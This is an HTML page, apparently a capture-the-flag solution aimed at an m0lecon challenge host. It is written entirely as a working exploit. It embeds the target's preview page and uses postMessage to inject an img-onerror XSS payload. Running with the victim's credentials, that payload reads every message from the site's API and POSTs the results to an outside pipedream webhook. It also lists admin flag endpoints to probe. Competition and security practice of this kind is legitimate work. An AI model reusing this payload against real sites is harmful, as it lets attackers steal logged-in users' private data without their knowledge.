<!doctype html>
<html>
    <body>
        <iframe
            id="f"
            src="https://b753857f-9748-4d5a-b219-43fbbefb0c2e.offsec.m0lecon.it/preview"
        ></iframe>
        <script>
            const WEBHOOK =
                "https://eorpvwpcvsuauqy.m.pipedream.net";
            const endpoints = [
              '/admin/api/flag',
              '/admin/flag',
              '/api/admin/flag',
              '/admin/api/messages',
            ];
            
            const payload = `<img src=x onerror="
              (async function() {
                var WEBHOOK = '${WEBHOOK}';
                var res = await fetch('/api/messages', {credentials:'include'});
                var msgs = await res.json();
                var ids = msgs.map(function(m){ return m.id; });
                var results = [];
                
                for (var i = 0; i < ids.length; i++) {
                  var r = await fetch('/api/messages/'+ids[i], {credentials:'include'});
                  if (r.ok) {
                    var d = await r.json();
                    results.push({id: ids[i], data: d});
                  }
                  await new Promise(function(r){ setTimeout(r, 300); });
                }
                
                await fetch(WEBHOOK, {
                  method: 'POST',
                  mode: 'no-cors',
                  keepalive: true,
                  body: JSON.stringify(results)
                });
              })();
            ">`;

            document.getElementById("f").onload = () => {
                document
                    .getElementById("f")
                    .contentWindow.postMessage({ html: payload }, "*");
            };
        </script>
    </body>
</html>
